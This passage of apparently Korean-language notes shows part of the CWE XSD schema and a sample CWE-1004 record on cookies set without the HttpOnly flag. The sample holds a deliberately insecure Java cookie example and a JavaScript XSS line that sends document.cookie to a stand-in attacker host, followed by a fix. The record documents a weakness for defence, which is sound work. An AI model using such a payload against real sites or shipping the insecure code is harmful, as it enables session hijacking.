    <xs:documentation>The RelatedNatureEnumeration simple type defines the different values that can be used to define the nature of a related weakness. A ChildOf nature denotes a related weakness at a higher level of abstraction. A ParentOf nature denotes a related weakness at a lower level of abstraction. The StartsWith, CanPrecede, and CanFollow relationships are used to denote weaknesses that are part of a chaining structure. The RequiredBy and Requires relationships are used to denote a weakness that is part of a composite weakness structure. The CanAlsoBe relationship denotes a weakness that, in the proper environment and context, can also be perceived as the target weakness. Note that the CanAlsoBe relationship is not necessarily reciprocal. The PeerOf relationship is used to show some similarity with the target weakness that does not fit any of the other type of relationships.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="ChildOf"/>
    <xs:enumeration value="ParentOf"/>
    <xs:enumeration value="StartsWith"/>
    <xs:enumeration value="CanFollow"/>
    <xs:enumeration value="CanPrecede"/>
    <xs:enumeration value="RequiredBy"/>
    <xs:enumeration value="Requires"/>
    <xs:enumeration value="CanAlsoBe"/>
    <xs:enumeration value="PeerOf"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="ResourceEnumeration">
    <xs:annotation>
    <xs:documentation>The ResourceEnumeration simple type defines different resources of a system.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="CPU"/>
    <xs:enumeration value="File or Directory"/>
    <xs:enumeration value="Memory"/>
    <xs:enumeration value="System Process"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="ScopeEnumeration">
    <xs:annotation>
    <xs:documentation>The ScopeEnumeration simple type defines the different areas of security that can be affected by exploiting a weakness.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Confidentiality"/>
    <xs:enumeration value="Integrity"/>
    <xs:enumeration value="Availability"/>
    <xs:enumeration value="Access Control"/>
    <xs:enumeration value="Accountability"/>
    <xs:enumeration value="Authentication"/>
    <xs:enumeration value="Authorization"/>
    <xs:enumeration value="Non-Repudiation"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="StatusEnumeration">
    <xs:annotation>
    <xs:documentation>The StatusEnumeration simple type defines the different status values that an entity (view, category, weakness) can have. A value of Deprecated refers to an entity that has been removed from CWE, likely because it was a duplicate or was created in error. A value of Obsolete is used when an entity is still valid but no longer is relevant, likely because it has been superseded by a more recent entity. A value of Incomplete means that the entity does not have all important elements filled, and there is no guarantee of quality. A value of Draft refers to an entity that has all important elements filled, and critical elements such as Name and Description are reasonably well-written; the entity may still have important problems or gaps. A value of Usable refers to an entity that has received close, extensive review, with critical elements verified. A value of Stable indicates that all important elements have been verified, and the entry is unlikely to change significantly in the future. Note that the quality requirements for Draft and Usable status are very resource-intensive to accomplish, while some Incomplete and Draft entries are actively used by the general public; so, this status enumeration might change in the future.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Deprecated"/>
    <xs:enumeration value="Draft"/>
    <xs:enumeration value="Incomplete"/>
    <xs:enumeration value="Obsolete"/>
    <xs:enumeration value="Stable"/>
    <xs:enumeration value="Usable"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="StakeholderEnumeration">
    <xs:annotation>
    <xs:documentation>The StakeholderEnumeration simple type defines the different types of users within the CWE community.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Academic Researchers"/>
    <xs:enumeration value="Applied Researchers"/>
    <xs:enumeration value="Assessment Teams"/>
    <xs:enumeration value="Assessment Tool Vendors"/>
    <xs:enumeration value="CWE Team"/>
    <xs:enumeration value="Educators"/>
    <xs:enumeration value="Hardware Designers"/>
    <xs:enumeration value="Information Providers"/>
    <xs:enumeration value="Product Customers"/>
    <xs:enumeration value="Product Vendors"/>
    <xs:enumeration value="Software Developers"/>
    <xs:enumeration value="Vulnerability Analysts"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="StructureEnumeration">
    <xs:annotation>
    <xs:documentation>The StructureEnumeration simple type lists the different structural natures of a weakness. A Simple structure represents a single weakness whose exploitation is not dependent on the presence of another weakness. A Composite is a set of weaknesses that must all be present simultaneously in order to produce an exploitable vulnerability, while a Chain is a set of weaknesses that must be reachable consecutively in order to produce an exploitable vulnerability.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Chain"/>
    <xs:enumeration value="Composite"/>
    <xs:enumeration value="Simple"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="StructuredCodeNatureEnumeration">
    <xs:annotation>
    <xs:documentation>The StructuredCodeNatureEnumeration sinple type defines the different values that state what type of code is being shown in an eample.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Attack"/>
    <xs:enumeration value="Bad"/>
    <xs:enumeration value="Good"/>
    <xs:enumeration value="Informative"/>
    <xs:enumeration value="Mitigation"/>
    <xs:enumeration value="Result"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="TaxonomyMappingFitEnumeration">
    <xs:annotation>
    <xs:documentation>The TaxonomyMappingFitEnumeration simple type defines the different values used to describe how close a certain mapping to CWE is.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Exact"/>
    <xs:enumeration value="CWE More Abstract"/>
    <xs:enumeration value="CWE More Specific"/>
    <xs:enumeration value="Imprecise"/>
    <xs:enumeration value="Perspective"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="TaxonomyNameEnumeration">
    <xs:annotation>
    <xs:documentation>The TaxonomyNameEnumeration simple type lists the different known taxomomies that can be mapped to CWE.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="7 Pernicious Kingdoms"/>
    <xs:enumeration value="19 Deadly Sins"/>
    <xs:enumeration value="Aslam"/>
    <xs:enumeration value="Bishop"/>
    <xs:enumeration value="CERT C Secure Coding"/>
    <xs:enumeration value="CERT C++ Secure Coding"/>
    <xs:enumeration value="The CERT Oracle Secure Coding Standard for Java (2011)"/>
    <xs:enumeration value="CLASP"/>
    <xs:enumeration value="ISA/IEC 62443"/>
    <xs:enumeration value="Landwehr"/>
    <xs:enumeration value="OMG ASCSM"/>
    <xs:enumeration value="OMG ASCRM"/>
    <xs:enumeration value="OMG ASCMM"/>
    <xs:enumeration value="OMG ASCPEM"/>
    <xs:enumeration value="OWASP Top Ten 2004"/>
    <xs:enumeration value="OWASP Top Ten 2007"/>
    <xs:enumeration value="OWASP Top Ten"/>
    <xs:enumeration value="PLOVER"/>
    <xs:enumeration value="Protection Analysis"/>
    <xs:enumeration value="RISOS"/>
    <xs:enumeration value="SEI CERT C Coding Standard"/>
    <xs:enumeration value="SEI CERT C++ Coding Standard"/>
    <xs:enumeration value="SEI CERT Oracle Coding Standard for Java"/>
    <xs:enumeration value="SEI CERT Perl Coding Standard"/>
    <xs:enumeration value="Software Fault Patterns"/>
    <xs:enumeration value="Weber, Karger, Paradkar"/>
    <xs:enumeration value="WASC"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="TechnicalImpactEnumeration">
    <xs:annotation>
    <xs:documentation>The TechnicalImpactEnumeration simple type describes the technical impacts that can arise if an adversary successfully exploits a weakness.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Modify Memory"/>
    <xs:enumeration value="Read Memory"/>
    <xs:enumeration value="Modify Files or Directories"/>
    <xs:enumeration value="Read Files or Directories"/>
    <xs:enumeration value="Modify Application Data"/>
    <xs:enumeration value="Read Application Data"/>
    <xs:enumeration value="DoS: Crash, Exit, or Restart"/>
    <xs:enumeration value="DoS: Amplification"/>
    <xs:enumeration value="DoS: Instability"/>
    <xs:enumeration value="DoS: Resource Consumption (CPU)"/>
    <xs:enumeration value="DoS: Resource Consumption (Memory)"/>
    <xs:enumeration value="DoS: Resource Consumption (Other)"/>
    <xs:enumeration value="Execute Unauthorized Code or Commands"/>
    <xs:enumeration value="Gain Privileges or Assume Identity"/>
    <xs:enumeration value="Bypass Protection Mechanism"/>
    <xs:enumeration value="Hide Activities"/>
    <xs:enumeration value="Alter Execution Logic"/>
    <xs:enumeration value="Quality Degradation"/>
    <xs:enumeration value="Unexpected State"/>
    <xs:enumeration value="Varies by Context"/>
    <xs:enumeration value="Reduce Maintainability"/>
    <xs:enumeration value="Reduce Performance"/>
    <xs:enumeration value="Reduce Reliability"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="TechnologyClassEnumeration">
    <xs:annotation>
    <xs:documentation>The TechnologyClassEnumeration simple type contains a list of values corresponding to different classes of technologies. The value "Not Technology-Specific" is used to indicate that the entry is not limited to a small set of technologies, i.e., it can appear in many different technologies.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Client Server">
    <xs:annotation>
    <xs:documentation>Represents technology involving a distributed application but for the purposes of CWE does not leverage a web browser.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Cloud Computing">
    <xs:annotation>
    <xs:documentation>Represents technology that involves data storage and computing power being made available to multiple users via the internet instead of using local systems, without the need for users to perform all system management themselves.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="ICS/OT">
    <xs:annotation>
    <xs:documentation>Represents technology related to Industrial Control Systems (ICS) and Operational Techology (OT), which are often considered to be distinct from Information Technology (IT) systems.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Mainframe"/>
    <xs:enumeration value="Mobile"/>
    <xs:enumeration value="N-Tier"/>
    <xs:enumeration value="SOA">
    <xs:annotation>
    <xs:documentation>Represents technology related to Service-oriented architecture (SOA).</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="System on Chip">
    <xs:annotation>
    <xs:documentation>Represents technology that integrates all components of a computer within a single integrated circuit, to include FPGA and ASIC.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Web Based">
    <xs:annotation>
    <xs:documentation>Represents technology that involves applications or single-page sites that leverage a web browser to support client interactions.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Not Technology-Specific">
    <xs:annotation>
    <xs:documentation>Used to indicate that the entry is not limited to a small set of technologies, i.e., it can appear in many different technologies.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="TechnologyNameEnumeration">
    <xs:annotation>
    <xs:documentation>The TechnologyNameEnumeration simple type contains a list of values corresponding to different technologies. A technology represents a generally accepted feature of a system and often refers to a high-level functional component within a system.</xs:documentation>
    <xs:documentation>Within this context, "IP" stands for "Intellectual Property" and is the term used to distinguish unique blocks within a System on Chip, with each block potentially coming from a different source.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="AI/ML">
    <xs:annotation>
    <xs:documentation>Represents technology related to Artificial Intelligence (AI) and Machine Learning (ML) systems. Note: terminology in this space is inconsistently used, but the AI WG agreed on this usage for CWE 4.15.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Web Server"/>
    <xs:enumeration value="Database Server"/>
    <xs:enumeration value="Accelerator Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) dedicated to offload a specific workload to enhance performance: DSP, packet processing, mathematical, compression, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Analog and Mixed Signal Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) that controls/senses the electricals for communication which receives/transmits signals conditioned outside of a system’s digital domain.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Audio/Video Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) designed to manipulate audio/video data: coders/decoders, speech recognition, format converters, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Bus/Interface Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) implementing an interconnect among elements in a computing system: I2C, PCIe, DDR, MMC, USB, GPIO, NoC, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Clock/Counter Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) reflecting the passage of time in oscillations or human units: Real Time Clock, Watchdog, Monotonic Counter, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Communication Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) designed to transmit/receive information: Modulator/Demodulator, GPS, 802.11, Bluetooth, CDMA/DSM, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Controller Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) circuit hard-wired (e.g., an FSM) to react in a closed-loop control system or other limited context, to control another entity: Arbiter, APIC, USB, Peripheral, Memory, Storage, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Memory Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) implementing volatile (transient) data storage: DRAM, SRAM, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Microcontroller Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) implementing a specialized processor acting as a programmable controller.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Network on Chip Hardware"/>
    <xs:enumeration value="Power Management Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) that controls and/or monitors the power state of a system: voltage regulators, power controllers, power monitors, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Processor Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) implementing a general-purpose computing engine: CPU, GPU, RISC, CISC, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Security Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP), including hardware security modules (HSM), designed to protect assets: cryptography, auth, tamper detection, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Sensor Hardware"/>
    <xs:enumeration value="Storage Hardware"/>
    <xs:enumeration value="Test/Debug Hardware">
    <xs:annotation>
    <xs:documentation>hardware Intellectual Property (IP) designed to verify functionality and identify root cause of defects: JTAG, BIST, boundary scan, pattern generator, etc.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="UsageEnumeration">
    <xs:annotation>
    <xs:documentation>The UsageEnumeration simple type is used for whether this CWE entry is supported for mapping.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Discouraged">
    <xs:annotation>
    <xs:documentation>this CWE ID should not be used to map to real-world vulnerabilities</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Prohibited">
    <xs:annotation>
    <xs:documentation>this CWE ID must not be used to map to real-world vulnerabilities</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Allowed">
    <xs:annotation>
    <xs:documentation>this CWE ID may be used to map to real-world vulnerabilities</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Allowed-with-Review">
    <xs:annotation>
    <xs:documentation>this CWE ID could be used to map to real-world vulnerabilities in limited situations requiring careful review</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="ViewTypeEnumeration">
    <xs:annotation>
    <xs:documentation>The ViewTypeEnumeration simple type defines the different types of views that can be found within CWE. A graph is a hierarchical representation of weaknesses based on a specific vantage point that a user may take. The hierarchy often starts with a category, followed by a class/base weakness, and ends with a variant weakness. In addition to graphs, a view can be a slice, which is a flat list of entries that does not specify any relationships between those entries. An explicit slice is a subset of weaknesses that are related through some external factor. For example, an explicit slice may be used to represent mappings to external groupings like a Top-N list. An implicit slice is a subset of weaknesses that are related through a specific attribute, as indicated by the Filter element of the View. For example, an implicit slice may refer to all weaknesses in draft status, or all class level weaknesses.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Implicit"/>
    <xs:enumeration value="Explicit"/>
    <xs:enumeration value="Graph"/>
    </xs:restriction>
    </xs:simpleType>
    <!--  ===============================================================================  -->
    <!--  ==============================  STRUCTURED TEXT  ==============================  -->
    <!--  ===============================================================================  -->
    <xs:complexType name="StructuredTextType" mixed="true">
    <xs:annotation>
    <xs:documentation>The StructuredTextType complex type is used to allow XHTML content embedded within standard string data. Some common elements are: <BR/> to insert a line break, <UL><LI/></UL> to create a bulleted list, <OL><LI/></OL> to create a numbered list, and <DIV style="margin-left: 40px"></DIV> to create a new indented section.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:any namespace="http://www.w3.org/1999/xhtml" minOccurs="0" maxOccurs="unbounded" processContents="strict"/>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="StructuredCodeType" mixed="true">
    <xs:annotation>
    <xs:documentation>The StructuredCodeType complex type is used to present source code examples and other structured text that is not a regular paragraph. It allows embedded XHTML content to enable formatting of the code. The required Nature attribute states what type of code the example shows. The optional Language attribute states which source code language is used in the example. This is mostly appropriate when the Nature is "good" or "bad".</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:any namespace="http://www.w3.org/1999/xhtml" minOccurs="0" maxOccurs="unbounded" processContents="strict"/>
    </xs:sequence>
    <xs:attribute name="Language" type="cwe:LanguageNameEnumeration"/>
    <xs:attribute name="Nature" type="cwe:StructuredCodeNatureEnumeration" use="required"/>
    </xs:complexType>
    </xs:schema>
    ```
    
- 예시 데이터
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?><Weakness_Catalog Name="CWE" Version="4.18" Date="2025-09-09" xmlns="http://cwe.mitre.org/cwe-7" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://cwe.mitre.org/cwe-7 http://cwe.mitre.org/data/xsd/cwe_schema_v7.2.xsd" xmlns:xhtml="http://www.w3.org/1999/xhtml"> <Weaknesses> <Weakness ID="1004" Name="Sensitive Cookie Without 'HttpOnly' Flag" Abstraction="Variant" Structure="Simple" Status="Incomplete"> <Description>The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.</Description> <Extended_Description>The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.</Extended_Description> <Related_Weaknesses> <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1000" Ordinal="Primary"/> </Related_Weaknesses> <Applicable_Platforms> <Language Class="Not Language-Specific" Prevalence="Undetermined"/> <Technology Class="Web Based" Prevalence="Undetermined"/> </Applicable_Platforms> <Background_Details> <Background_Detail>An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details.</Background_Detail> </Background_Details> <Modes_Of_Introduction> <Introduction> <Phase>Implementation</Phase> </Introduction> </Modes_Of_Introduction> <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit> <Common_Consequences> <Consequence> <Scope>Confidentiality</Scope> <Impact>Read Application Data</Impact> <Note>If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties.</Note> </Consequence> <Consequence> <Scope>Integrity</Scope> <Impact>Gain Privileges or Assume Identity</Impact> <Note>If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user.</Note> </Consequence> </Common_Consequences> <Detection_Methods> <Detection_Method Detection_Method_ID="DM-14"> <Method>Automated Static Analysis</Method> <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description> <Effectiveness>High</Effectiveness> </Detection_Method> </Detection_Methods> <Potential_Mitigations> <Mitigation> <Phase>Implementation</Phase> <Description>Leverage the HttpOnly flag when setting a sensitive cookie in a response.</Description> <Effectiveness>High</Effectiveness> <Effectiveness_Notes>While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie.</Effectiveness_Notes> </Mitigation> </Potential_Mitigations> <Demonstrative_Examples> <Demonstrative_Example> <Intro_Text>In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.</Intro_Text> <Body_Text>The snippet of code below establishes a new cookie to hold the sessionID.</Body_Text> <Example_Code Nature="Bad" Language="Java"> <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>response.addCookie(c);</xhtml:div> </Example_Code> <Body_Text>The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:</Body_Text> <Example_Code Nature="Attack" Language="JavaScript"> <xhtml:div>document.write('&lt;img src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"&gt;'</xhtml:div> </Example_Code> <Body_Text>When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.</Body_Text> <Body_Text>To mitigate the risk, use the setHttpOnly(true) method.</Body_Text> <Example_Code Nature="Good" Language="Java"> <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>c.setHttpOnly(true);<xhtml:br/>response.addCookie(c);</xhtml:div> </Example_Code> </Demonstrative_Example> </Demonstrative_Examples> <Observed_Examples> <Observed_Example> <Reference>CVE-2022-24045</Reference> <Description>Web application for a room automation system has client-side Javascript that sets a sensitive cookie without the HTTPOnly security attribute, allowing the cookie to be accessed.</Description> <Link>https://www.cve.org/CVERecord?id=CVE-2022-24045</Link> </Observed_Example> <Observed_Example> <Reference>CVE-2014-3852</Reference> <Description>CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.</Description> <Link>https://www.cve.org/CVERecord?id=CVE-2014-3852</Link> </Observed_Example> <Observed_Example> <Reference>CVE-2015-4138</Reference> <Description>Appliance for managing encrypted communications does not use HttpOnly flag.</Description> <Link>https://www.cve.org/CVERecord?id=CVE-2015-4138</Link> </Observed_Example> </Observed_Examples> <References> <Reference External_Reference_ID="REF-2"/> <Reference External_Reference_ID="REF-3"/> <Reference External_Reference_ID="REF-4"/> <Reference External_Reference_ID="REF-5"/> </References> <Mapping_Notes> <Usage>Allowed</Usage> <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale> <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments> <Reasons> <Reason Type="Acceptable-Use"/> </Reasons> </Mapping_Notes> <Content_History> <Submission> <Submission_Name>CWE Content Team</Submission_Name> <Submission_Organization>MITRE</Submission_Organization> <Submission_Date>2017-01-02</Submission_Date> <Submission_Version>2.10</Submission_Version> <Submission_ReleaseDate>2017-01-19</Submission_ReleaseDate> </Submission> <Modification> <Modification_Name>CWE Content Team</Modification_Name> <Modification_Organization>MITRE</Modification_Organization> <Modification_Date>2017-11-08</Modification_Date> <Modification_Comment>updated Applicable_Platforms, References, Relationships</Modification_Comment> </Modification> <Modification> <Modification_Name>CWE Content Team</Modification_Name> <Modification_Organization>MITRE</Modification_Organization> <Modification_Date>2020-02-24</Modification_Date> <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment> </Modification> <Modification> <Modification_Name>CWE Content Team</Modification_Name> <Modification_Organization>MITRE</Modification_Organization> <Modification_Date>2021-10-28</Modification_Date> <Modification_Comment>updated Relationships</Modification_Comment> </Modification> <Modification> <Modification_Name>CWE Content Team</Modification_Name> <Modification_Organization>MITRE</Modification_Organization> <Modification_Date>2023-01-31</Modification_Date> <Modification_Comment>updated Description</Modification_Comment> </Modification> <Modification> <Modification_Name>CWE Content Team</Modification_Name> <Modification_Organization>MITRE</Modification_Organization> <Modification_Date>2023-04-27</Modification_Date> <Modification_Comment>updated Detection_Factors, References, Relationships, Time_of_Introduction</Modification_Comment> </Modification> <Modification> <Modification_Name>CWE Content Team</Modification_Name> <Modification_Organization>MITRE</Modification_Organization> <Modification_Date>2023-06-29</Modification_Date> <Modification_Comment>updated Mapping_Notes</Modification_Comment> </Modification> <Modification> <Modification_Name>CWE Content Team</Modification_Name> <Modification_Organization>MITRE</Modification_Organization> <Modification_Date>2023-10-26</Modification_Date> <Modification_Comment>updated Observed_Examples</Modification_Comment> </Modification> </Content_History> </Weakness>
    ```